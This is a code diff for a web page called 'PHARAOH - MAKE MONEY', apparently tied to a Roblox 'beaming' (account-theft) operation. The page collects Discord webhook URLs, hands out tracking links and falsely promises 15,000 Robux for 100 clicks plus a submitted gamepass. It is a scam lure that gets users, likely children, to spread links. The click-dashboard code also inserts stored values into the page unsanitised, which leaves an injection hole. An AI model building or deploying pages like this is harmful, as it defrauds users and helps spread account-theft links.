@@ -1,13 +1,368 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <!-- [Previous head content remains exactly the same] -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PHARAOH - MAKE MONEY</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&family=Rajdhani:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* [All previous CSS remains exactly the same] */
+        :root {
+            --black: #0a0a0a;
+            --dark-black: #000000;
+            --white: #FFFFFF;
+            --gray: #AAAAAA;
+            --dark-red: #6B0000;
+            --medium-red: #8B0000;
+            --bright-red: #FF0000;
+            --light-red: #FF3333;
+            --neon-red: #ff073a;
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background-color: var(--black);
+            color: var(--white);
+            line-height: 1.6;
+            min-height: 100vh;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .scanlines {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(255, 0, 0, 0.03) 0%, rgba(255, 0, 0, 0) 2px);
+            background-size: 100% 4px;
+            z-index: 1;
+            pointer-events: none;
+            animation: scanline 8s linear infinite;
+        }
+
+        @keyframes scanline {
+            0% { background-position: 0 0; }
+            100% { background-position: 0 100%; }
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 2rem;
+            position: relative;
+            z-index: 2;
+        }
+        
+        .main-card {
+            background: rgba(10, 10, 10, 0.9);
+            border-radius: 0.5rem;
+            border: 1px solid var(--bright-red);
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            overflow: hidden;
+            padding: 2rem;
+        }
+        
+        .page-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 2.5rem;
+            font-weight: 700;
+            color: var(--white);
+            text-shadow: 0 0 10px var(--bright-red), 0 0 20px var(--bright-red);
+            margin-bottom: 0.5rem;
+            text-align: center;
+        }
+        
+        .page-subtitle {
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.2rem;
+            color: var(--white);
+            margin-bottom: 2rem;
+            text-align: center;
+        }
+        
+        .home-btn {
+            position: absolute;
+            top: 2rem;
+            right: 2rem;
+            background: var(--dark-red);
+            color: var(--white);
+            padding: 0.5rem 1rem;
+            border-radius: 0.5rem;
+            text-decoration: none;
+            font-family: 'Orbitron', sans-serif;
+            transition: all 0.3s ease;
+            border: 1px solid var(--bright-red);
+        }
+        
+        .home-btn:hover {
+            background: var(--bright-red);
+        }
+        
+        .section-title {
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: var(--white);
+            text-shadow: 0 0 8px var(--bright-red);
+            margin-bottom: 1.5rem;
+            font-family: 'Orbitron', sans-serif;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 0.5rem;
+            color: var(--white);
+            font-weight: 600;
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 0.5rem;
+        }
+        
+        .input-group input {
+            flex: 1;
+        }
+        
+        .form-control {
+            width: 100%;
+            padding: 0.75rem;
+            background: rgba(0, 0, 0, 0.5);
+            border: 1px solid var(--bright-red);
+            border-radius: 0.5rem;
+            color: var(--white);
+            font-family: 'Rajdhani', sans-serif;
+        }
+        
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            border-radius: 0.5rem;
+            font-weight: 600;
+            text-decoration: none;
+            transition: all 0.3s ease;
+            background-color: var(--dark-red);
+            color: var(--white);
+            border: 1px solid var(--bright-red);
+            box-shadow: 0 4px 15px rgba(255, 0, 0, 0.2);
+            font-family: 'Orbitron', sans-serif;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+        }
+        
+        .btn:hover {
+            background-color: var(--bright-red);
+            transform: translateY(-2px);
+            box-shadow: 0 8px 20px rgba(255, 0, 0, 0.4);
+        }
+        
+        .btn-copy {
+            width: auto;
+            padding: 0.75rem;
+            background: rgba(139, 0, 0, 0.5);
+        }
+        
+        .btn-copy:hover {
+            background: var(--bright-red);
+        }
+        
+        .link-display {
+            word-break: break-all;
+            background: rgba(0, 0, 0, 0.3);
+            padding: 1rem;
+            border-radius: 0.5rem;
+            margin: 0 auto;
+            border: 1px dashed var(--bright-red);
+            font-family: monospace;
+            text-align: center;
+            width: 100%;
+            max-width: 100%;
+            display: block;
+            overflow-wrap: anywhere;
+        }
+        
+        .success-message {
+            color: #00ff00;
+            text-align: center;
+            margin: 1rem 0;
+            font-weight: 600;
+        }
+        
+        .error-message {
+            color: var(--bright-red);
+            text-align: center;
+            margin: 1rem 0;
+            font-weight: 600;
+        }
+        
+        .form-note {
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 0.5rem;
+            text-align: center;
+        }
+        
+        .footer-note {
+            text-align: center;
+            color: var(--gray);
+            font-size: 0.9rem;
+            margin-top: 2rem;
+        }
+        
+        .hidden {
+            display: none;
+        }
+
+        /* Clicks page specific styles */
+        #clicks-container {
+            display: none;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 2rem;
+        }
+
+        .clicks-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 2rem;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid var(--bright-red);
+        }
+
+        .clicks-table th, .clicks-table td {
+            padding: 1rem;
+            text-align: left;
+            border-bottom: 1px solid var(--medium-red);
+        }
+
+        .clicks-table th {
+            background: var(--dark-red);
+            font-family: 'Orbitron', sans-serif;
+        }
+
+        .clicks-table tr:hover {
+            background: rgba(139, 0, 0, 0.2);
+        }
+        
+        @media (max-width: 768px) {
+            .container {
+                padding: 1rem;
+            }
+            
+            .page-title {
+                font-size: 2rem;
+                margin-top: 2rem;
+            }
+            
+            .home-btn {
+                position: relative;
+                top: auto;
+                right: auto;
+                margin-bottom: 1rem;
+                display: inline-block;
+            }
+            
+            .main-card {
+                padding: 1.5rem;
+            }
+        }
     </style>
 </head>
 <body>
-    <!-- [All previous HTML remains exactly the same until the script] -->
+    <div class="scanlines"></div>
+    
+    <!-- Main Content Container -->
+    <div class="container" id="main-container" style="display: none;">
+        <a href="/" class="home-btn">
+            <i class="fas fa-home"></i> Home
+        </a>
+        
+        <div class="main-card">
+            <h1 class="page-title">MAKE MONEY</h1>
+            <p class="page-subtitle">Generate your own link, share it, and earn 15,000 Robux when you reach 100 clicks!</p>
+            
+            <!-- Initial Form Section -->
+            <div id="initial-section">
+                <div class="form-group">
+                    <label for="webhook-url">Your Discord Webhook Url</label>
+                    <input type="text" id="webhook-url" class="form-control" placeholder="https://discord.com/api/webhooks/...">
+                    <p class="form-note">We'll send notifications to this webhook when someone clicks your link.</p>
+                </div>
+                
+                <button id="generate-btn" class="btn">
+                    <i class="fas fa-link"></i> GENERATE LINK
+                </button>
+                
+                <div id="webhook-error" class="error-message hidden"></div>
+            </div>
+            
+            <!-- Generated Link Section -->
+            <div id="link-section" class="hidden">
+                <h2 class="section-title">Your Link is Ready!</h2>
+                <div class="input-group" style="flex-direction: column;">
+                    <div class="link-display" id="generated-link">https://pharaohbeam.xyz/loading...</div>
+                    <button id="copy-btn" class="btn btn-copy" title="Copy to clipboard" style="margin-top: 1rem;">
+                        <i class="fas fa-copy"></i> COPY LINK
+                    </button>
+                </div>
+            </div>
+            
+            <!-- Gamepass Submission Section -->
+            <div id="gamepass-section" class="hidden">
+                <h2 class="section-title">SUBMIT YOUR GAMEPASS</h2>
+                <p style="text-align: center; margin-bottom: 1rem;">Create a Roblox gamepass for 6000-8000 Robux and submit the link below. We'll automatically purchase it when you reach 100 clicks!</p>
+                
+                <div class="form-group">
+                    <input type="text" id="gamepass-url" class="form-control" placeholder="https://www.roblox.com/game-pass/...">
+                </div>
+                
+                <button id="submit-gamepass" class="btn">
+                    <i class="fas fa-check"></i> SUBMIT GAMEPASS
+                </button>
+                
+                <div id="success-message" class="success-message hidden">Gamepass Submitted! We will buy your gamepass once you reach 100 clicks</div>
+                <div id="gamepass-error" class="error-message hidden"></div>
+            </div>
+            
+            <p class="footer-note">If you have any issues, contact <a href="https://discord.gg/phar" style="color: var(--bright-red);">https://discord.gg/phar</a> on Discord.</p>
+        </div>
+    </div>
+
+    <!-- Clicks Dashboard Container -->
+    <div id="clicks-container" style="display: none;">
+        <h1 class="page-title">CLICKS DASHBOARD</h1>
+        <table class="clicks-table">
+            <thead>
+                <tr>
+                    <th>Link ID</th>
+                    <th>Clicks</th>
+                    <th>Created At</th>
+                    <th>Gamepass URL</th>
+                </tr>
+            </thead>
+            <tbody id="clicks-table-body">
+                <!-- Data will be inserted here by JavaScript -->
+            </tbody>
+        </table>
+    </div>
 
     <script>
         // Configuration
@@ -15,6 +370,8 @@
         const PHARAOH_PFP = 'https://media.discordapp.net/attachments/1360001414813843589/1377923321957580822/PHARAOH_BE4M_PFP.gif';
         
         // DOM Elements
+        const mainContainer = document.getElementById('main-container');
+        const clicksContainer = document.getElementById('clicks-container');
         const initialSection = document.getElementById('initial-section');
         const linkSection = document.getElementById('link-section');
         const gamepassSection = document.getElementById('gamepass-section');
@@ -27,6 +384,45 @@
         const submitGamepassBtn = document.getElementById('submit-gamepass');
         const successMessage = document.getElementById('success-message');
         const gamepassError = document.getElementById('gamepass-error');
+        const clicksTableBody = document.getElementById('clicks-table-body');
+
+        // Show the appropriate container based on the page
+        if (window.location.pathname === '/clicks' || window.location.pathname === '/clicks.html') {
+            clicksContainer.style.display = 'block';
+            loadClicksData();
+        } else {
+            mainContainer.style.display = 'block';
+        }
+
+        // Load clicks data for the dashboard
+        function loadClicksData() {
+            const clicksData = [];
+            
+            // Get all stored links from localStorage
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                if (key.startsWith('link_')) {
+                    const data = JSON.parse(localStorage.getItem(key));
+                    clicksData.push(data);
+                }
+            }
+            
+            // Sort by most clicks first
+            clicksData.sort((a, b) => b.clicks - a.clicks);
+            
+            // Populate the table
+            clicksTableBody.innerHTML = '';
+            clicksData.forEach(data => {
+                const row = document.createElement('tr');
+                row.innerHTML = `
+                    <td>${data.linkId}</td>
+                    <td>${data.clicks}</td>
+                    <td>${new Date(data.createdAt).toLocaleString()}</td>
+                    <td>${data.gamepassUrl || 'Not submitted'}</td>
+                `;
+                clicksTableBody.appendChild(row);
+            });
+        }
         
         // Generate random link ID
         function generateLinkId() {
@@ -299,8 +695,10 @@
             }
         }
 
-        // Run the click processor when page loads
-        processClick();
+        // Run the click processor when page loads if not on /clicks
+        if (!(window.location.pathname === '/clicks' || window.location.pathname === '/clicks.html')) {
+            processClick();
+        }
     </script>
 </body>
 </html>
